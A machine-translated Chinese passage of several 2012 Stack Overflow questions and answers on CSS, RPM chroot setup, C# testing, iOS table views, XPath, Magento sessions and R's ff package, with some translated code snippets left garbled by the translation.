[Z-index](http://coding.smashingmagazine.com/2009/09/15/the-z-index-css-property-a-comprehensive-look/)可以是一个善变的情妇。我通常会为这样的事情求助于内容渲染顺序。基于上述标记和您的想法，我倾向于同意将包含的背景`#SideImage`放在其任何内容的“顶部”是不可能的。有关更多信息，请参阅该 Smashing 链接中的图表。

如果您添加了元素`<div id="SideFill" class="ir"></div>`，您可以对您的 css 进行更改：

```
#SideImage {
  宽度：100%；
  位置：相对；
}
#SideFill {
  位置：绝对；
  宽度：15%；
  高度：100%；
  顶部：0；
  对：0；
  背景：透明 url("/23456jjsg886635kksjp/EQI/EQIImages/SideImage.png") 重复-y 0 0;
}

```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-12-28T19:12:55.600

css 的 background-image 属性用于将图像置于元素的背景。要将图像放入内容中或将图像提升到内容之上，请使用`<img>`标签。

您意识到您希望应该在**BACK**中的背景图像在前面，对吗？在 CSS 中无法正常执行此操作。您需要有一个`<img>`带有您想要的图像的元素，并使用高 z-index 将其固定/绝对定位。

# installation - RPM -i 在创建 chroot 监狱时无法打开文件

> ID：14074446
> 
> 赞同：0
> 
> 时间：2012-12-28T19:06:27.440
> 
> 标签：installation, centos, package, rpm, chroot

我一直在寻找这个错误，但找不到任何东西。我正在尝试在 Centos 6.2 64 位版本上创建一个 chroot 监狱，我正在执行以下操作：

```
mkdir -p /home/chroot/
mkdir -p /home/chroot/var/lib/rpm
rpm --rebuilddb --root=/home/chroot/
cd /usr/src
wget http://mirror.centos.org/centos-6/6.3/os/x86_64/Packages/centos-release-6-3.el6.centos.9.x86_64.rpm
rpm -i --root=/home/chroot/ --nodeps centos-release-6-3.el6.centos.9.x86_64.rpm 
```

哪个失败说：

```
warning: centos-release-6-3.el6.centos.9.x86_64.rpm: Header V3 RSA/SHA1 Signature, key ID c105b9de: NOKEY
error: opening of centos-release-6-3.el6.centos.9.x86_64.rpm fails: No such file or directory
/home/chroot/var/lib/rpm: No such file or directory 
```

对详细 (-ivv) 输出执行相同操作：

```
D: ============== centos-release-6-3.el6.centos.9.x86_64.rpm
D: loading keyring from pubkeys in /home/chroot/var/lib/rpm/pubkeys/*.key
D: couldn't find any keys in /home/chroot/var/lib/rpm/pubkeys/*.key
D: loading keyring from rpmdb
D: opening  db environment /home/chroot/var/lib/rpm cdb:mpool:joinenv
D: opening  db index       /home/chroot/var/lib/rpm/Packages rdonly mode=0x0
D: locked   db index       /home/chroot/var/lib/rpm/Packages
D: opening  db index       /home/chroot/var/lib/rpm/Name rdonly mode=0x0
D: Expected size:        20444 = lead(96)+sigs(1284)+pad(4)+data(19060)
D:   Actual size:        20444
advertencia:centos-release-6-3.el6.centos.9.x86_64.rpm: CabeceraV3 RSA/SHA1 Signature, ID de clave c105b9de: NOKEY
D: ========== relocations
D:      added binary package [0]
D: found 0 source and 1 binary packages
D: ========== recording tsort relations
D: ========== tsorting packages (order, #predecessors, #succesors, tree, depth)
D:     0    0    0    0    1   +centos-release-6-3.el6.centos.9.x86_64
D: installing binary packages
D: closed   db index       /home/chroot/var/lib/rpm/Name
D: closed   db index       /home/chroot/var/lib/rpm/Packages
D: closed   db environment /home/chroot/var/lib/rpm
D: removed  db environment /home/chroot/var/lib/rpm
D: opening  db environment /home/chroot/var/lib/rpm create:cdb:mpool:joinenv
D: opening  db index       /home/chroot/var/lib/rpm/Packages create mode=0x42
D: sanity checking 1 elements
D: opening  db index       /home/chroot/var/lib/rpm/Name create mode=0x42
D: running pre-transaction scripts
D: computing 20 file fingerprints
D: opening  db index       /home/chroot/var/lib/rpm/Basenames create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Group create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Requirename create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Providename create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Conflictname create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Obsoletename create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Triggername create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Dirnames create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Requireversion create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Provideversion create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Installtid create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Sigmd5 create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Sha1header create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Filedigests create mode=0x42
D: opening  db index       /home/chroot/var/lib/rpm/Pubkeys create mode=0x42
Preparando paquetes para la instalaciÃ³n...
D: computing file dispositions
D: 0x00000802     4096    450469192    121281462 /
D: ========== +++ centos-release-6-3.el6.centos.9 x86_64-linux 0x0
error: la apertura de centos-release-6-3.el6.centos.9.x86_64.rpm fallÃ³: No such file or directory
D: running post-transaction scripts
D: closed   db index       /home/chroot/var/lib/rpm/Pubkeys
D: closed   db index       /home/chroot/var/lib/rpm/Filedigests
D: closed   db index       /home/chroot/var/lib/rpm/Sha1header
D: closed   db index       /home/chroot/var/lib/rpm/Sigmd5
D: closed   db index       /home/chroot/var/lib/rpm/Installtid
D: closed   db index       /home/chroot/var/lib/rpm/Provideversion
D: closed   db index       /home/chroot/var/lib/rpm/Requireversion
D: closed   db index       /home/chroot/var/lib/rpm/Dirnames
D: closed   db index       /home/chroot/var/lib/rpm/Triggername
D: closed   db index       /home/chroot/var/lib/rpm/Obsoletename
D: closed   db index       /home/chroot/var/lib/rpm/Conflictname
D: closed   db index       /home/chroot/var/lib/rpm/Providename
D: closed   db index       /home/chroot/var/lib/rpm/Requirename
D: closed   db index       /home/chroot/var/lib/rpm/Group
D: closed   db index       /home/chroot/var/lib/rpm/Basenames
D: closed   db index       /home/chroot/var/lib/rpm/Name
D: closed   db index       /home/chroot/var/lib/rpm/Packages
D: closed   db environment /home/chroot/var/lib/rpm
/home/chroot/var/lib/rpm: No such file or directory
D: removed  db environment /home/chroot/var/lib/rpm 
```

我似乎找不到原因，因为所有文件/目录都存在，并且无法修复它。有什么建议吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:36:33.483

我刚刚在我的机器上尝试了你所说的一切，它奏效了。

尝试以下事情：

1：确保您使用最新的 rpm 版本。就我而言，它是 4.9

2：不要下载rpm，从/usr/src执行“rpm -i”。可能是权限问题。

3：确保你使用 sudo

4：检查/home/chroot/var/lib/rpm的权限。应该是 755

祝你好运 ！！

# java - 如何在 Android 中获取 content://mms-sms/conversations 意图？

> ID：14074448
> 
> 赞同：0
> 
> 时间：2012-12-28T19:06:35.880
> 
> 标签：java, android, mobile

嗨，我想知道如何向广播接收器指定我想收听内容：//mms-sms/conversations 意图。

在 Log cat 中，您可以看到在模拟器或真实设备上打开消息应用程序时触发的 Intent。我想在这个 Intent 被激活时触发一个动作。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:48:58.440

> 我想知道如何向广播接收器指定要监听 content://mms-sms/conversations 意图的广播接收器。

这是不可能的。

> 在 Log cat 中，您可以看到在模拟器或真实设备上打开消息应用程序时触发的 Intent。

正确的。但是，这是开始一项活动。您无法注册`BroadcastReceiver`以了解用户何时开始任何特定活动。

# c# - 如何在知道有错误空间的情况下比较小数

> ID：14074455
> 
> 赞同：11
> 
> 时间：2012-12-28T19:07:15.783
> 
> 标签：c#, unit-testing, decimal

我有两种不同的方法来计算一个值。两种方法都运行后，我得到以下信息：

```
decimal a = 145.2344;
decimal b = 145.2345; 
```

我有一个单元测试：

```
 Assert.AreEqual(a,b); 
```

我希望能够解释 +/- .0001 的差异。如何添加此规则？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-28T19:09:42.550

在[NUnit 的*约束模型*](http://www.nunit.org/index.php?p=constraintModel&r=2.4.8)中，你可以这样做：

```
Assert.That(Math.Abs(a-b), Is.LessThan(0.0001M)); 
```

更好的是，让它成为一个函数：

```
void AssertDiff(decimal a, decimal b, decimal diff = 0.0001) {
     Assert.That(Math.Abs(a-b), Is.LessThan(diff));
} 
```

**编辑：**在 MS 单元测试框架中，执行以下操作：

```
void AssertDiff(decimal a, decimal b, decimal diff = 0.0001) {
     Assert.IsTrue(Math.Abs(a-b) < diff);
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-28T19:09:15.523

简单的：

```
if (Math.Abs(a-b) < 0.0001m)
    // equal 
```

# iphone - 如何使用 selectRowAtIndexPath 强制 UITableViewCell 选择？

> ID：14074457
> 
> 赞同：3
> 
> 时间：2012-12-28T19:07:19.237
> 
> 标签：iphone, objective-c, ios, uitableview

我正在尝试使用 selectRowAtIndexPath 强制选择（突出显示） UITableViewCell ..

例如，假设我希望始终突出显示表格视图中的第一个单元格，我在 viewDidAppear 中应用以下逻辑

```
[self.tableViewPrompts selectRowAtIndexPath:[NSIndexPath indexPathForRow:0 inSection:0] animated:NO scrollPosition:0]; 
```

工作得很好。但是当我尝试在应用程序的其他地方应用相同的逻辑时，单元格没有被选中。我什至尝试在调用上述方法之前取消选择其他单元格，并在调用此方法之前和之后重新加载 tableview，但这些方法似乎都不起作用！

我什至使用 tableview 的委托强行调用 didSelectRowAtIndexPath.Event 这不起作用。

PS：单元格的选择不会触发任何我想要实现的操作只是突出显示所需的单元格。

我在这里做错了什么？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:55:29.273

> 单元格的选择不会触发任何我想要实现的操作只是突出显示所需的单元格。

为什么不使用单元格的突出显示属性？

```
UITableViewCell *cell = [self cellForRowAtIndexPath: [NSIndexPath indexPathForRow: 0 inSection: 0]];
cell.highlighted = YES; 
```

现在无法测试它，但它应该工作......

**编辑**

当然，更好的是：改变你的 cellForRowAtIndexPath 来做到这一点

```
-(UITableViewCell) tableView:cellForRowAtIndexPath:
//...
if (indexPath.row == 0 && indexPath.section == 0) cell.highlighted = YES
else cell.highlighted = NO;
//...
return cell; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T19:53:12.127

我很困惑为什么这对你的情况不起作用。这是我在视图控制器内的几个地方使用的方法，包括`viewDidAppear`我认为与您正在做的事情没有真正的区别：

```
- (void)selectRow1
{
    NSIndexPath* idx = [NSIndexPath indexPathForRow:1 inSection:0];
    [_table selectRowAtIndexPath:idx animated:NO scrollPosition:UITableViewScrollPositionMiddle];
    [self tableView:_table didSelectRowAtIndexPath:idx];
} 
```

`_table`是我的表属性变量，并且调用`didSelectRowAtIndexPath`了 ，因此可能会发生选择操作，但与您的代码唯一真正的区别是 scrollPosition 参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-02T06:39:35.833

只需使用 setSelected 突出显示单元格：

```
 [cell setSelected:YES]; 
```

我已经为整个目的创建了这个扩展[UITableView-Ext](https://github.com/aqibmumtaz/UITableView-Ext)

# persistence - 我应该使用数据库而不是序列化文件吗？

> ID：14074459
> 
> 赞同：3
> 
> 时间：2012-12-28T19:07:31.787
> 
> 标签：persistence

我正在使用我的第一个真实世界应用程序，该应用程序包括跟踪中型医疗办公室的医学研究。系统需要跟踪医生、用户、患者、研究模板和研究报告。该程序的目的是为任何可能的研究应用预先格式化的研究模板，跟踪每个患者的研究并保持易于查找的文件系统。每个研究报告都以 html 文件的形式保存在特定文件夹中，可以直接从 Windows 使用或打印。

我估计在任何给定时间大约有 20 位活跃医生、30 个不同的研究模板、12 个用户；患者和研究报告将是累积的，并且将无限期地保持活跃。我估计我们每年谈论 2000 名新患者和 6000 份新研究报告。

我几乎完成了这项工作，但最初我选择将数据存储在序列化文件中，并且我没有考虑改用数据库。现在，考虑到数据的大小将迅速增长，我认为我应该考虑使用数据库来代替。由于许多不同的原因，特别是我担心序列化文件的选择，因为我注意到我将来在任何类中所做的任何更改都可能与序列化文件冲突并阻止我重新打开它。我很欣赏任何评论，文件太大而无法使用？在这种情况下，它是一个可接受的序列化文件，请向我传递任何想法或意见。谢谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:36:44.273

您对破坏与这些文件的兼容性的担忧是绝对合理的。我通过采取以下步骤在一个小型库存项目中解决了同样的问题：

*   设置数据库服务器（MySQL）
*   将hibernate集成到项目中
*   使用 JPA 注释在新包中重新实现可序列化类（如果 DB 模式不会中断，请将注释添加到现有类）
*   使用 JPA 实体生成数据库模式
*   为现有对象实现导入器（反序列化、转换和保持引用完整性。
*   现有数据对象的导入和验证
*   整个项目中从旧类到新 JPA 实体的任何所需重构
*   删除旧类及其导入器（应该在存储库中休眠）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:11:46.757

大多数人会说无论如何你都应该使用数据库。如果这是一个专业的应用程序，您就不能冒数据被损坏的风险，并且这种可能性确实存在，例如由于您的代码中的错误和有人错误地使用了该程序。

重要的是数据的价值，而不是大小。假设它已经运行了一年并且文件变得无法使用。您是否要告诉他们应该从头开始重新输入所有数据？

如果它只是一个练习，我仍然建议你使用数据库，因为你会学到一些东西。一个流行的选择是使用休眠，它是 CV++。;)

# xpath - 从标题中获取兄弟姐妹，直到无语义表中的下一个标题

> ID：14074462
> 
> 赞同：2
> 
> 时间：2012-12-28T19:07:51.743
> 
> 标签：xpath, scrapy

使用[Scrapy](http://scrapy.org)我想解析一个包含非常无语义表的网页。我正在寻找的是“打印每个后续兄弟，直到遇到以下元素”-XPath-query。

```
<table>
    <tr>
        <th>Title</th>
        <th>Name</th>
        <th>Comment</th>
        <th>Note</th>
    </tr>
    <tr style="background-color:#CCDDEF;">
        <td colspan="4"> <b>HEADER1</b></td>
    </tr>
    <tr>
        <td>Title1.1</td>
        <td>-</td>
        <td>Info1.1</td>
        <td></td>
    </tr>
    <tr style="background-color:#CCDDEF;">
        <td colspan="4"> <b>HEADER2</b></td>
    </tr>
    <tr>
        <td>Title2.1</td>
        <td>Name2.1</td>
        <td></td>
        <td></td>
    </tr>
    <tr>
        <td>Title2.2</td>
        <td>Name2.2</td>
        <td>Info2.2</td>
        <td></td>
    </tr>
    <tr style="background-color:#CCDDEF;">
        <td colspan="4"> <b>HEADER3</b></td>
    </tr>
    <tr>
        <td>Title3.1</td>
        <td>Name3.1</td>
        <td></td>
        <td></td>
    </tr>
</table> 
```

我想在每个标题下对每个标题、名称、评论和注释进行分组。我尝试过使用各种 XPath（带有 和 的变体）`following-sibling`，但要么一无所获，要么一无所有，要么每一个都不是标题。`preceding-sibling``count``tr`

我目前正在使用`//tr[@style]`or获取标题`//tr[td[@colspan="4"]]`。

以下是我的 Scrapy-spider 中的解析函数（它打印标题和所有`tr`不是标题的 's）：

```
def parse(self, response):
    hxs = HtmlXPathSelector(response)
    sites = hxs.select('//*[@id="content-text"]//tr[td[@colspan="4"]]')
    for site in sites:
        print site.select('./td/b/text()').extract()
        print site.select('./following-sibling::tr[not(td[@colspan])]') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T20:02:31.013

**这个 XPath 表达式**：

```
/*/tr[@style or td[@colspan='4']][1]/following-sibling::tr
       [count(. | /*/tr[@style or td[@colspan='4']][2]/preceding-sibling::tr)
       =
        count(/*/tr[@style or td[@colspan='4']][2]/preceding-sibling::tr)
       ] 
```

**选择`tr`第一个和第二个标题之间的所有元素**：

```
<tr>
   <td>Title1.1</td>
   <td>-</td>
   <td>Info1.1</td>
   <td/>
</tr> 
```

要选择`tr`第 K 个和第 (K+1) 个标题之间的所有元素，只需在上面的表达式中替换为`1`(`K`数字) 和`2`(`K+1`数字)。

**基于 XSLT 的验证**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/">
     <xsl:copy-of select=
     "/*/tr[@style or td[@colspan='4']][1]/following-sibling::tr
             [count(. | /*/tr[@style or td[@colspan='4']][2]/preceding-sibling::tr)
             =
              count(/*/tr[@style or td[@colspan='4']][2]/preceding-sibling::tr)
             ]
     "/>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<table>
    <tr>
        <th>Title</th>
        <th>Name</th>
        <th>Comment</th>
        <th>Note</th>
    </tr>
    <tr style="background-color:#CCDDEF;">
        <td colspan="4">
            <b>HEADER1</b>
        </td>
    </tr>
    <tr>
        <td>Title1.1</td>
        <td>-</td>
        <td>Info1.1</td>
        <td></td>
    </tr>
    <tr style="background-color:#CCDDEF;">
        <td colspan="4">
            <b>HEADER2</b>
        </td>
    </tr>
    <tr>
        <td>Title2.1</td>
        <td>Name2.1</td>
        <td></td>
        <td></td>
    </tr>
    <tr>
        <td>Title2.2</td>
        <td>Name2.2</td>
        <td>Info2.2</td>
        <td></td>
    </tr>
    <tr style="background-color:#CCDDEF;">
        <td colspan="4">
            <b>HEADER3</b>
        </td>
    </tr>
    <tr>
        <td>Title3.1</td>
        <td>Name3.1</td>
        <td></td>
        <td></td>
    </tr>
</table> 
```

**计算 Xpath 表达式并将选定节点复制到输出：**

```
<tr>
   <td>Title1.1</td>
   <td>-</td>
   <td>Info1.1</td>
   <td/>
</tr> 
```

**说明**：

这是节点集交集的 Kayessian（在 Michael Kay 博士之后）公式的简单应用：

```
$ns1[count(.|$ns2) = count($ns2)] 
```

在这种特殊情况下，我们替换`$ns1`为：

```
/*/tr[@style or td[@colspan='4']][1]/following-sibling::tr 
```

我们`$ns2`用：

```
/*/tr[@style or td[@colspan='4']][2]/preceding-sibling::tr 
```

# c# - 使用 FontFamily 和 SystemFonts 的静态成员的正确方法是什么？

> ID：14074463
> 
> 赞同：1
> 
> 时间：2012-12-28T19:07:59.423
> 
> 标签：c#, .net

我正在尝试设置使用的字体`TextBox`，例如，`System.Drawing.FontFamily.GenericMonospace`和`System.Drawing.SystemFonts.IconTitleFont.SizeInPoints`。

当我使用如下代码时：

```
_TBTextBox.Font = new Font(System.Drawing.FontFamily.GenericMonospace, System.Drawing.SystemFonts.IconTitleFont.SizeInPoints); 
```

[.Net Memory Profiler](http://memprofiler.com/)告诉我，一个实例`System.Drawing.Font`和一个实例`System.Drawing.FontFamily`都被垃圾收集而没有被处置。

将字体集包装在`using`块中消除了处理问题，但似乎效率低下，并且应该是不必要的。

```
// No garbage-collection-without-disposal issues
using (Font iconTitleFont = System.Drawing.SystemFonts.IconTitleFont)
{
    using (FontFamily family = System.Drawing.FontFamily.GenericMonospace)
    {
         _TBTextBox.Font = new Font(family, iconTitleFont.SizeInPoints);
    }
} 
```

是否必须首先将这些类的静态成员的所有使用分配给自己处置的局部变量？如果是，为什么？

# magento - 创建帐户后 Magento 页面冻结/空白

> ID：14074469
> 
> 赞同：-1
> 
> 时间：2012-12-28T19:08:37.317
> 
> 标签：magento, session

回复：EE v1.10.1.1

你好，

最近我发现在用户提交表单创建帐户后，注册过程页面冻结。它死在'/customer/account/createpost/'上。

似乎在 /app/code/core/Mage/Customer/controllers/AccountController.php 行 #325 附近的这条线上死掉了（

```
$session->setCustomerAsLoggedIn($customer);
```

）。

将用户设置为已登录时，似乎在无效/空会话中窒息。只有在刷新冻结页面后才会记录/显示错误。我在任何日志中都没有发现任何其他错误/警告/消息（包括服务器日志）：

```
 a:5:{i:0;s:62:"Mage registry key "_singleton/customer/session" already exists";i:1;s:1247:"#0 /server_path/html/app/Mage.php(192): Mage::throwException('Mage registry k...')
#1 /server_path/html/app/Mage.php(446): Mage::register('_singleton/cust...', Object(Mage_Customer_Model_Session))
#2 /server_path/html/app/code/core/Mage/Customer/controllers/AccountController.php(50): Mage::getSingleton('customer/sessio...')
#3 /server_path/html/app/code/core/Mage/Customer/controllers/AccountController.php(75): Mage_Customer_AccountController->_getSession()
#4 /server_path/html/app/code/core/Mage/Core/Controller/Varien/Action.php(409): Mage_Customer_AccountController->preDispatch()
#5 /server_path/html/app/code/core/Mage/Core/Controller/Varien/Router/Standard.php(253): Mage_Core_Controller_Varien_Action->dispatch('create')
#6 /server_path/html/app/code/core/Mage/Core/Controller/Varien/Front.php(176): Mage_Core_Controller_Varien_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
#7 /server_path/html/app/code/core/Mage/Core/Model/App.php(340): Mage_Core_Controller_Varien_Front->dispatch()
#8 /server_path/html/app/Mage.php(627): Mage_Core_Model_App->run(Array)
#9 /server_path/html/index.php(95): Mage::run('', 'store')
#10 {main}";s:3:"url";s:25:"/customer/account/create/";s:11:"script_name";s:10:"/index.php";s:4:"skin";s:2:"sg";} 
```

下一行 (#326) 发送欢迎电子邮件。如果第 325 行被注释掉，那么电子邮件仍然会被发送，如果这样做了，第一次登录他们的帐户的尝试会在第 137 行的“/customer/account/loginPost/”上阻塞：

```
$session->login($login['username'], $login['password']);
```

刷新一次页面会显示仪表板。

无论哪种方式，帐户似乎都已正确创建，之后帐户功能正常，没有其他登录问题。

最近发生了一些变化，但它们都不应该与客户和/或客户/会话有任何关系......至少我不知道。

碰巧有人知道代码中任何常见的潜在magento陷阱......我可以在另一个脚本/mod中间接地做一些会导致这样的事情的事情吗？

我在这条路上的时间比我应该的要长，我觉得我已经回到起点而没有任何线索/成功。我有点觉得我错过了/忽略了一些明显的东西。任何输入、想法、建议或想法都将受到赞赏。

谢谢。

尊敬的，詹姆斯D

[b]注意：[/b] 我最后一次亲自检查这个功能是一两个月前，它没有这样做。从那以后，我制作/添加了一些自定义模块，但它们不应“直接”连接到客户和/或客户会话。

此外，一年多以前，我们确实为“customer_login”和“customer_before_save”事件添加了一些内容，但过去它们没有出现任何问题，所以我认为这两者都不是原因。 . 唯一的其他变化是 Magento 从 EE 1.9 升级到 1.10。

空会话示例....

这是页面阻塞时会话的样子：

```
Mage_Customer_Model_Session Object
    (
        [_customer:protected] => 
        [_isCustomerIdChecked:protected] => 
        [_skipSessionIdFlag:protected] => 
        [_data:protected] => Array
            (
                [_session_validator_data] => Array
                    (
                        [remote_addr] => 155.77.22.255
                        [http_via] => 
                        [http_x_forwarded_for] => 
                        [http_user_agent] => Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11
                    )

                [session_hosts] => Array
                    (
                        [www.slimgenics.com] => 1
                    )

                [id] => 
                [messages] => Mage_Core_Model_Message_Collection Object
                    (
                        [_messages:protected] => Array
                            (
                            )

                        [_lastAddedMessage:protected] => Mage_Core_Model_Message_Success Object
                            (
                                [_type:protected] => success
                                [_code:protected] => Thank you for registering.
                                [_class:protected] => 
                                [_method:protected] => 
                                [_identifier:protected] => 
                                [_isSticky:protected] => 
                            )

                    )

                [before_auth_url] => https://www.domain.com/customer/account/index/
                [no_referer] => 1
            )

        [_hasDataChanges:protected] => 1
        [_origData:protected] => 
        [_idFieldName:protected] => 
        [_isDeleted:protected] =>
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-30T08:39:45.060

您描述的错误应该在这里提出（magento CE 1.7.0.2 供参考）：

```
// app/Mage.php:472
$registryKey = '_singleton/'.$modelClass;
if (!self::registry($registryKey)) {
    self::register($registryKey, self::getModel($modelClass, $arguments));
} 
```

因此，在注册之前立即检查此密钥是否存在。我不认为，EE 代码会做其他事情。所以你必须回答的问题是：为什么`!self::registry($registryKey)` `false`？

你很幸运，我挖得更深了。我认为 Session-Object 的创建失败并返回 false。这意味着对密钥的检查为真，但检查`Mage::register()`失败，因为它检查`isset()`：

```
// app/Mage.php:216
public static function register($key, $value, $graceful = false)
{
    if (isset(self::$_registry[$key])) {
        if ($graceful) {
            return;
        }
        self::throwException('Mage registry key "'.$key.'" already exists');
        // [...] 
```

问题是：为什么会话对象的创建失败。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-19T17:23:13.000

问题已解决。

问题源于我不知道的文件更改。这种变化显然导致了一个循环（它正在死亡）抛出“无法重新声明”消息。由被多次调用的文件中的“require”语句引起。

我发现这一点的唯一方法是通过自定义 API。我用它来测试帐户创建功能，幸运的是，Soap 处理程序能够抛出错误并将其记录在 Magento error.log 中（以前从未这样做过）。'redeclare' 错误消息就在那里，并引导我找到已更改的文件。

感谢大家的意见。

# r - 如何在大型数据集的简单“for”循环中使用 ff 包

> ID：14074473
> 
> 赞同：9
> 
> 时间：2012-12-28T19:09:15.553
> 
> 标签：r

我正在尝试对一个大表（约 9400 万行，3 列）进行一些基本计算，这些表需要在 R 中使用像 ff 这样的包。但是，我在使用这个包时遇到了问题并且内存不足，虽然我知道我的电脑有能力处理这个。我在下面包括了我的硬件/软件规格，以及我的代码似乎没有正确使用 ff 包。我已经花了 100 多个小时阅读所有提到 ff 包中任何内容的 pdf、ppt 和网站，但我还没有找到任何可以清楚地解释如何使用 ff 的内容（至少对于像我这样的业余爱好者而言）。对我做错的任何帮助将不胜感激。当我数到大约 110 万行时，这个逻辑似乎有效，但在那之后它似乎超出了界限。

我还尝试将“for”循环分解为总大小的 1/200 块；在循环的每一轮中为现有的 ShortPrice & LongPrice ff 文件创建新的 ff 对象，然后在每轮结束时创建 rm()、gc()。当我在开始时通过 read.table.ffdf 为每一列创建 ff 文件时，由于某种原因，我在尝试使用 vmode = "quad", "integer 为现有 TradePosition ff 文件创建新的 ff 对象时丢失了 TradePosition 值”或“原始”。

硬件/软件规格：

*   2012 年 6 月 Macbook Pro 配备 16 GB RAM、i7 四核处理器、512 GB SSD
*   OS X 10.8.2
*   使用 32 位 R 程序

数据/表格：

*   名为“Trades.txt”的文本文件有 94,741,221 行，三列
*   第 1 列名为 TradePosition（“因子”类型，水平/值 =“0”、“空头”或“多头”）
*   第 2 列名为 ShortPrice（“double”类型，值表示欧元/美元货币价格，保留 5 个小数位）
*   第 3 列名为 LongPrice（“double”类型，值表示欧元/美元货币价格，保留 5 个小数位）
*   内部 R 变量“DatasetLength”= 94,741,221

代码：

```
library(ff)
options("fftempdir"="/Users/neil/Code/","ffbatchbytes"=20*getOption("ffbatchbytes"),"ffmaxbytes"=8*getOption("ffmaxbytes"),"ffpagesize"=1000*65536,"ffcaching"="mmnoflush")
ffdfTrades <- read.table.ffdf(file="/Users/neil/Code/Trades.txt",nrows=DatasetLength,FUN="read.table",header=TRUE,sep=";",quote="",colClasses=c("factor","numeric","numeric"),comment.char="")

Transactions <- c(rep(0,DatasetLength))
dataindex <- 1
for (dataindex in seq(1,DatasetLength-1,1)) {

    if (ffdfTrades$TradePosition[dataindex]!=ffdfTrades$TradePosition[dataindex+1]) {

        if (ffdfTrades$TradePosition[dataindex+1]=="Short") {

            if (ffdfTrades$TradePosition[dataindex]=="Long") {
                Transactions[dataindex+1] <- -2*ffdfTrades$ShortPrice[dataindex+1]
            }

            else {
                Transactions[dataindex+1] <- -1*ffdfTrades$ShortPrice[dataindex+1]
            }
        }

        else {

            if (ffdfTrades$TradePosition[dataindex+1]=="Long") {

                if (ffdfTrades$TradePosition[dataindex]=="Short") {
                    Transactions[dataindex+1] <- 2*ffdfTrades$LongPrice[dataindex+1]
                }

                else {
                    Transactions[dataindex+1] <- 1*ffdfTrades$LongPrice[dataindex+1]
                }
            }
        }
    }

    message(paste("Row ",dataindex," done.",sep=""))
    dataindex <- dataindex + 1
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-29T01:55:55.120

首先说明：如果您有 16Gb 的 RAM，您运行 32 位版本的 R 是一个遗憾，为什么不使用 64 位版本来充分使用它？

对于您的问题：正如 Henrico 指出的那样，您没有正确使用 ff 或 R 。在 R 中循环每一行并不是做事的方式，不是在 ff 中，不是在基础 R 中。你需要对你的代码进行矢量化。我建议您学习 R 课程，该课程与处理大数据无关，但与 R 数据处理的基本概念有关。

除了那句话之外，这里是您在 ff 中使用包 ffbase 中的一些额外实用程序寻找的内容。请注意，我没有查看您对 Short/Long 和乘法的确切说明，但是 ffifelse 可以根据您的需要进行更改，就像您在 R 的基本包中使用普通 ifelse 所做的那样。祝你好运尝试ff。

```
size <- 1000000
trades <- data.frame(TradePosition = factor(sample(c("0","Short","Long"), size, replace=TRUE)), ShortPrice = rnorm(size), LongPrice = rnorm(size))
write.table(trades, file = "Trades.txt", sep=";", row.names=FALSE)

require(ff)
require(ffbase)
trades <- read.table.ffdf(file="Trades.txt", sep=";", header=TRUE, colClasses=c("factor","numeric","numeric"))
idx <- cumsum(ff(1, length=nrow(trades)))
idx <- ffwhich(idx, idx < nrow(trades))
trades$previousposition <- c(ff(factor(NA)), trades$TradePosition[idx])
yourmultiplier <- 2
yourothermultiplier <- -1
trades$transactions <- ffifelse(trades$TradePosition == "Long", 
                            ffifelse(trades$previousposition == "Short", yourmultiplier*trades$ShortPrice, trades$ShortPrice),
                            ffifelse(trades$previousposition == "Long", yourothermultiplier*trades$LongPrice, trades$LongPrice)) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-29T20:11:28.140

以下是介绍如何在 R 中使用大数据的（恕我直言）幻灯片的链接。

[http://www.bytemining.com/2010/07/taking-r-to-the-limit-part-i-parallelization-in-r/](http://www.bytemining.com/2010/07/taking-r-to-the-limit-part-i-parallelization-in-r/) [http://www.bytemining.com/2010/08/taking- r-to-the-limit-part-ii-large-datasets-in-r/](http://www.bytemining.com/2010/08/taking-r-to-the-limit-part-ii-large-datasets-in-r/)

两者都来自对 R 用户组的讨论，并详细介绍了处理大型数据集的不同方法。他们专注于大内存，但 ff 也有特色。

我和之前的一些评论者一样，更喜欢 bigmemory 方法。主要是因为更容易找到可用的文档。具体来说，通过上面幻灯片中的航空公司数据示例进行工作是相当大开眼界的。

然后，根据您的情况，而不是蛮力强制它，还尝试从 9500 万行中提取大量样本可能足以得出有意义的结论。

祝你好运！

# c# - 当我构建 ac# 项目时，服务参考代码在哪里

